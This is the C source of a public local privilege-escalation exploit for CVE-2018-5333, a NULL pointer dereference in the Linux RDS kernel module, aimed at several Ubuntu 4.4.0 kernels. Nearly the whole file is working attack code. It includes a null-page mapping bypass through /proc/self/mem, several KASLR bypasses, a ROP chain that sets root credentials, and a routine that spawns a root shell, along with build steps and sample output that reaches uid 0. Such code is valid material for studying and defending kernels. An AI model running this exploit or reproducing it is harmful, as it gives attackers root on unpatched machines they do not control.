// Local root exploit for rds_atomic_free_op NULL pointer dereference
// in the rds kernel module in the Linux kernel through 4.14.13 (CVE-2018-5333).
//
// Includes KASLR, SMEP, and mmap_min_addr bypasses. No SMAP bypass.
// Targets: Ubuntu 4.4.0 kernels <= 4.4.0-116-generic #140-Ubuntu SMP.
//
// The rds kernel module is not loaded by default on Ubuntu.
// - install: sudo apt install "linux-image-extra-$(uname -r)-generic"
// - load:    sudo insmod "/lib/modules/$(uname -r)/kernel/net/rds/rds.ko"
//
// This exploit is a modified extension of the original local root
// proof of concept exploit written by wbowling as an example of using
// CVE-2019-9213 to make previous kernel bugs exploitable:
// - https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4
//
// The original exploit is based on the null pointer dereference
// reproducer proof of concept and analysis by 0x36:
// - https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c
//
// wbowling has done most of the hard work, by utilising Jann Horn's
// mmap_min_addr bypass technique (CVE-2019-9213), allowing userland to mmap
// virtual address 0 (without which this bug would not be exploitable on
// systems with a sufficiently large value for /proc/sys/vm/mmap_min_addr);
// and developing the appropriate ROP chain.
// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
//
// This exploit adds offsets for additional kernels, and introduces some
// additional features, such as KASLR bypasses and system checks, including:
// - check if system supports SMAP
// - check if system supports RDS sockets
// - Jann Horn's mincore KASLR bypass via heap page disclosure (CVE-2017-16994)
//   - https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
// - spender's /proc/kallsyms and /boot/System.map KASLR bypasses
//   - https://grsecurity.net/~spender/exploits/exploit.txt
//
// Shoutouts to nstarke for adding additional kernel offsets.
// - https://github.com/bcoles/kernel-exploits/pulls?q=is%3Apr+author%3Anstarke
//
// This exploit also uses various code patterns copied from:
// - xairy's exploits:
//   - https://github.com/xairy/kernel-exploits
// - vnik's kernel ROP code:
//   - https://github.com/vnik5287/kernel_rop
// ---
// $ gcc cve-2018-5333.c -o cve-2018-5333
// $ ./cve-2018-5333
// [.] starting
// [.] checking kernel version...
// [.] kernel version '4.4.0-116-generic #140-Ubuntu' detected
// [~] done, version looks good
// [.] checking system...
// [~] done, looks good
// [.] mapping null address...
// [~] done, mapped null address
// [.] KASLR bypass enabled, getting kernel addr
// [.] trying /proc/kallsyms...
// [.] trying /boot/System.map-4.4.0-116-generic...
// [-] open/read(/boot/System.map-4.4.0-116-generic)
// [.] trying mincore info leak...
// [.] done, kernel text:   ffffffff81000000
// [.] commit_creds:        ffffffff810a4cf0
// [.] prepare_kernel_cred: ffffffff810a50e0
// [+] got root
// # id
// uid=0(root) gid=0(root) groups=0(root)
// ---
// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-5333
// <bcoles@gmail.com>

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#include <linux/rds.h>
#include <netinet/in.h>
#include <signal.h>
#include <setjmp.h>
#include <execinfo.h>
#include <ucontext.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

#define ENABLE_SYSTEM_CHECKS 1
#define ENABLE_KASLR_BYPASS  1

char *SHELL = "/bin/sh";

// Will be overwritten if ENABLE_KASLR_BYPASS
unsigned long KERNEL_BASE = 0xffffffff81000000ul;

// Will be overwritten by detect_versions().
int kernel = -1;

// kernel target struct, using ROP chain from wbowling's exploit
struct kernel_info {
  const char* kernel_version;
  uint64_t commit_creds;
  uint64_t prepare_kernel_cred;
  uint64_t xor_rdi;     //: xor edi, edi ; ret
  uint64_t mov_rdi_rax; //: mov rdi, rax ; pop rbx ; mov rax, rdi ; pop r12 ; pop rbp ; ret
  uint64_t xchg_esp;    //: xchg eax, esp ; shr bl, 0xbf ; xor eax, eax ; pop rbp ; ret
  uint64_t swapgs;      //: swapgs ; pop rbp ; ret
  uint64_t iretq;       //: iretq
};

// Targets
struct kernel_info kernels[] = {
  { "4.4.0-31-generic #50-Ubuntu",   0xa24a0, 0xa2890, 0x5d0c5, 0x1787a7, 0x3ffed8, 0x64644, 0x7d125  },
  { "4.4.0-38-generic #57-Ubuntu",   0xa2570, 0xa2960, 0x5d0c5, 0x178a97, 0x400968, 0x64634, 0x7d1e5  },
  { "4.4.0-42-generic #62-Ubuntu",   0xa25c0, 0xa29b0, 0x5d0c5, 0x178ac7, 0x400d78, 0x64634, 0x7d1a5  },
  { "4.4.0-112-generic #135-Ubuntu", 0xa3a90, 0xa3e80, 0x5d0c5, 0x17b657, 0x40b238, 0x646a4, 0x54137c },
  { "4.4.0-116-generic #140-Ubuntu", 0xa4cf0, 0xa50e0, 0x5e0c5, 0x17d5d7, 0x40ed08, 0x65734, 0x3a5b04 },
};

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *
// https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c

#define RAND_SIZE 4096

void trigger_bug()
{
  struct sockaddr_in sin;
  struct msghdr msg;
  char buf[RAND_SIZE];
  struct cmsghdr cmsg;

  memset(&sin, 0, sizeof(struct sockaddr));
  memset(&msg, 0, sizeof(msg));
  memset(buf, 0x40, sizeof(buf));
  memset(&cmsg, 0, sizeof(cmsg));

  int fd = socket(0x15, 5, 0); /* AF_RDS */
  if(fd < 0) {
    dprintf("[-] socket error - RDS module not loaded?\n");
    return;
  }

  sin.sin_family = AF_INET;
  sin.sin_port = htons(2000);
  sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  bind(fd, (struct sockaddr*)&sin, sizeof(sin));

  cmsg.cmsg_len = RAND_SIZE;
  cmsg.cmsg_type = RDS_CMSG_MASKED_ATOMIC_CSWP;
  cmsg.cmsg_level = SOL_RDS;

  memcpy(&buf[0], &cmsg, sizeof(cmsg));

  *(uint64_t *)(buf + 0x18) = 0x40404000; /* args->local_addr */

  msg.msg_name = &sin;
  msg.msg_namelen = sizeof(sin);
  msg.msg_iov = NULL;
  msg.msg_iovlen = 0;
  msg.msg_control = buf;
  msg.msg_controllen = RAND_SIZE;
  msg.msg_flags = MSG_DONTROUTE|MSG_PROXY|MSG_WAITALL;

  sendmsg(fd, &msg, 0);
}

// * * * * * * * * * * * * * * map null address * * * * * * * * * * * * *
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2

void map_null() {
  void *map = mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,
    MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);

  if (map == MAP_FAILED) {
    dprintf("[-] mmap(null_address)\n");
    exit(EXIT_FAILURE);
  }

  char* path = "/proc/self/mem";
  int fd = open(path, O_RDWR);

  if (fd == -1) {
    dprintf("open(%s)\n", path);
    exit(EXIT_FAILURE);
  }

  unsigned long addr = (unsigned long)map;

  while (addr != 0) {
    addr -= 0x1000;
    if (lseek(fd, addr, SEEK_SET) == -1) {
      dprintf("lseek()\n");
      exit(EXIT_FAILURE);
    }
    char cmd[1000];
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
    system(cmd);
  }
}

// * * * * * * * * * * * * * * * save state * * * * * * * * * * * * * * *
// https://github.com/vnik5287/kernel_rop

unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
  asm(
  "movq %%cs, %0\n"
  "movq %%ss, %1\n"
  "pushfq\n"
  "popq %2\n"
  : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

// * * * * * * * * * * * * * * SIGSEGV handler * * * * * * * * * * * * * *

void handler(int signo, siginfo_t* info, void* vcontext) {}

void debug_enable_sigsev_handler() {
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
}

// * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * *

#define CHUNK_SIZE 1024

int read_file(const char* file, char* buffer, int max_length) {
  int f = open(file, O_RDONLY);
  if (f == -1)
    return -1;
  int bytes_read = 0;
  while (1) {
    int bytes_to_read = CHUNK_SIZE;
    if (bytes_to_read > max_length - bytes_read)
      bytes_to_read = max_length - bytes_read;
    int rv = read(f, &buffer[bytes_read], bytes_to_read);
    if (rv == -1)
      return -1;
    bytes_read += rv;
    if (rv == 0)
      return bytes_read;
  }
}

#define PROC_CPUINFO_LENGTH 4096

static int check_env(void) {
  int fd = socket(0x15, 5, 0); /* AF_RDS */
  if(fd < 0) {
    dprintf("[-] socket error - RDS module not loaded?\n");
    exit(EXIT_FAILURE);
  }

  char buffer[PROC_CPUINFO_LENGTH];
  char* path = "/proc/cpuinfo";
  int length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);
  if (length == -1) {
    dprintf("[-] open/read(%s)\n", path);
    exit(EXIT_FAILURE);
  }

  char* found = memmem(&buffer[0], length, "smap", 4);
  if (found != NULL) {
    dprintf("[-] SMAP detected, no bypass available\n");
    exit(EXIT_FAILURE);
  }

  struct stat st;
  if (stat("/dev/grsec", &st) == 0) {
    dprintf("[!] Warning: grsec is in use\n");
  }

  return 0;
}

struct utsname get_kernel_version() {
  struct utsname u;
  int rv = uname(&u);
  if (rv != 0) {
    dprintf("[-] uname())\n");
    exit(EXIT_FAILURE);
  }
  return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

void detect_versions() {
  struct utsname u;
  char kernel_version[512];

  u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    dprintf("[-] system is not using a 64-bit kernel\n");
    exit(EXIT_FAILURE);
  }

  if (strstr(u.version, "-Ubuntu") == NULL) {
    dprintf("[-] system is not using an Ubuntu kernel\n");
    exit(EXIT_FAILURE);
  }

  char *u_ver = strtok(u.version, " ");
  snprintf(kernel_version, 512, "%s %s", u.release, u_ver);

  int i;
  for (i = 0; i < ARRAY_SIZE(kernels); i++) {
    if (strcmp(kernel_version, kernels[i].kernel_version) == 0) {
      dprintf("[.] kernel version '%s' detected\n", kernels[i].kernel_version);
      kernel = i;
      return;
    }
  }

  dprintf("[-] kernel version not recognized\n");
  exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *
// https://grsecurity.net/~spender/exploits/exploit.txt

unsigned long get_kernel_addr_kallsyms() {
  FILE *f;
  unsigned long addr = 0;
  char dummy;
  char sname[256];
  char* name = "startup_64";
  char* path = "/proc/kallsyms";

  dprintf("[.] trying %s...\n", path);
  f = fopen(path, "r");
  if (f == NULL) {
      dprintf("[-] open/read(%s)\n", path);
      return 0;
  }

  int ret = 0;
  while (ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      return addr;
    }
  }

  fclose(f);
  dprintf("[-] kernel base not found in %s\n", path);
  return 0;
}

// * * * * * * * * * * * * * * System.map KASLR bypass * * * * * * * * * * * * * *
// https://grsecurity.net/~spender/exploits/exploit.txt

unsigned long get_kernel_addr_sysmap() {
  FILE *f;
  unsigned long addr = 0;
  char path[512] = "/boot/System.map-";
  char version[32];

  struct utsname u;
  u = get_kernel_version();
  strcat(path, u.release);
  dprintf("[.] trying %s...\n", path);
  f = fopen(path, "r");
  if (f == NULL) {
    dprintf("[-] open/read(%s)\n", path);
    return 0;
  }

  char dummy;
  char sname[256];
  char* name = "startup_64";
  int ret = 0;
  while (ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      return addr;
    }
  }

  fclose(f);
  dprintf("[-] kernel base not found in %s\n", path);
  return 0;
}

// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431

unsigned long get_kernel_addr_mincore() {
  unsigned char buf[getpagesize() / sizeof(unsigned char)];
  unsigned long iterations = 20000000;
  unsigned long addr = 0;

  dprintf("[.] trying mincore info leak...\n");
  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
  if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,
       MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {
       dprintf("[-] mmap()\n");
     return 0;
  }

  int i;
  for (i = 0; i <= iterations; i++) {
    /* Touch a mishandle with this type mapping */
    if (mincore((void*)0x86000000, 0x1000000, buf)) {
      dprintf("[-] mincore()\n");
      return 0;
    }

    int n;
    for (n = 0; n < getpagesize()/sizeof(unsigned char); n++) {
      addr = *(unsigned long*)(&buf[n]);
      /* Kernel address space */
      if (addr > 0xffffffff00000000) {
        addr &= 0xffffffffff000000ul;
        if (munmap((void*)0x66000000, 0x20000000000))
          dprintf("[-] munmap()\n");
        return addr;
      }
    }
  }

  if (munmap((void*)0x66000000, 0x20000000000))
    dprintf("[-] munmap()\n");

  dprintf("[-] kernel base not found in mincore info leak\n");
  return 0;
}

// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *

unsigned long get_kernel_addr() {
  unsigned long addr = 0;

  addr = get_kernel_addr_kallsyms();
  if (addr) return addr;

  addr = get_kernel_addr_sysmap();
  if (addr) return addr;

  addr = get_kernel_addr_mincore();
  if (addr) return addr;

  dprintf("[-] KASLR bypass failed\n");
  exit(EXIT_FAILURE);

  return 0;
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

static void shell() {
  if (getuid() == 0 && geteuid() == 0) {
    dprintf("[+] got root\n");
    system(SHELL);
  } else {
    dprintf("[-] failed\n");
  }
  exit(EXIT_FAILURE);
}

void fork_shell() {
  pid_t rv;

  rv = fork();
  if (rv == -1) {
    dprintf("[-] fork()\n");
    exit(EXIT_FAILURE);
  }

  if (rv == 0)
    shell();
}

int main(int argc, char *argv[]) {
  if (argc > 1) SHELL = argv[1];

  dprintf("[.] starting\n");

  dprintf("[.] checking kernel version...\n");
  detect_versions();
  dprintf("[~] done, version looks good\n");

#if ENABLE_SYSTEM_CHECKS
  dprintf("[.] checking system...\n");
  check_env();
  dprintf("[~] done, looks good\n");
#endif

  dprintf("[.] mapping null address...\n");
  map_null();
  dprintf("[~] done, mapped null address\n");

#if ENABLE_KASLR_BYPASS
  dprintf("[.] KASLR bypass enabled, getting kernel addr\n");
  KERNEL_BASE = get_kernel_addr();
  dprintf("[.] done, kernel text:   %lx\n", KERNEL_BASE);
#endif

  unsigned long commit_creds =        (KERNEL_BASE + kernels[kernel].commit_creds);
  unsigned long prepare_kernel_cred = (KERNEL_BASE + kernels[kernel].prepare_kernel_cred);
  unsigned long xor_rdi =             (KERNEL_BASE + kernels[kernel].xor_rdi);
  unsigned long mov_rdi_rax =         (KERNEL_BASE + kernels[kernel].mov_rdi_rax);
  unsigned long xchg_esp =            (KERNEL_BASE + kernels[kernel].xchg_esp);
  unsigned long swapgs =              (KERNEL_BASE + kernels[kernel].swapgs);
  unsigned long iretq =               (KERNEL_BASE + kernels[kernel].iretq);

  dprintf("[.] commit_creds:        %lx\n", commit_creds);
  dprintf("[.] prepare_kernel_cred: %lx\n", prepare_kernel_cred);

  uint64_t page_size = getpagesize();
  uint64_t stack_aligned = (xchg_esp & 0x00000000fffffffful) & ~(page_size - 1);
  uint64_t stack_offset = xchg_esp % page_size;

  unsigned long *fake_stack = mmap((void*)stack_aligned, 0x200000,
    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);

  if (fake_stack == MAP_FAILED) {
    dprintf("[-] mmap(fake_stack)\n");
    exit(EXIT_FAILURE);
  }

  unsigned long *temp_stack = mmap((void*)0x30000000, 0x10000000,
    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);

  if (temp_stack == MAP_FAILED) {
    dprintf("[-] mmap(temp_stack)\n");
    exit(EXIT_FAILURE);
  }

  static unsigned long result = 0;
  unsigned long *data = (unsigned long *)0;
  data[1] = (uint64_t)&result;
  data[3] = xchg_esp;

  save_state();
  debug_enable_sigsev_handler();

  fake_stack = (unsigned long *)(stack_aligned + stack_offset);

  int i = 0;

  fake_stack[i++] = xor_rdi;
  fake_stack[i++] = prepare_kernel_cred;
  fake_stack[i++] = mov_rdi_rax;
  fake_stack[i++] = 0x12345678;
  fake_stack[i++] = 0x12345678;
  fake_stack[i++] = 0x12345678;
  fake_stack[i++] = commit_creds;

  fake_stack[i++] = swapgs;
  fake_stack[i++] = 0x12345678;

  fake_stack[i++] = iretq;
  fake_stack[i++] = (unsigned long)shell;
  fake_stack[i++] = user_cs;
  fake_stack[i++] = user_rflags;
  fake_stack[i++] = (unsigned long)(temp_stack + 0x500000);
  fake_stack[i++] = user_ss;

  trigger_bug();

  return 0;
}

